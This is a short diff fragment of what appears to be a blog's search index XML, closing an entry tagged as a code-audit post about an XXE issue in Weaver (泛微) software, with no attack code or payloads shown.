+
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>泛微</tag>
+        <tag>xxe</tag>
       </tags>
   </entry>
 </search>
